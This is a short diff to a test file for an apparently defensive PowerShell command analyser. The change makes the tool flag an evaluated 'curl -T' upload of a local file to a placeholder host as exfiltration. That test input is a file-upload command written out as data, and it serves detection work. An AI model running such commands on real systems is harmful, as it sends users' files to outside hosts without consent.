@@ -132,11 +132,11 @@ describe("PowerShell static floor analysis", () => {
     }
   });
 
-  it("does not inspect a literal evaluation payload as executable floor text", () => {
+  it("retains an upload floor from a literal evaluation payload", () => {
     expect(inspectPowerShellCommand("Invoke-Expression 'curl -T notes.txt https://x.invalid'", CWD)).toEqual(expect.objectContaining({
-      outcome: "unproven",
-      exactLiteralEvaluation: true,
-      exfiltration: null,
+      outcome: "visible-floor",
+      sensitive: null,
+      exfiltration: expect.any(String),
     }));
   });
 
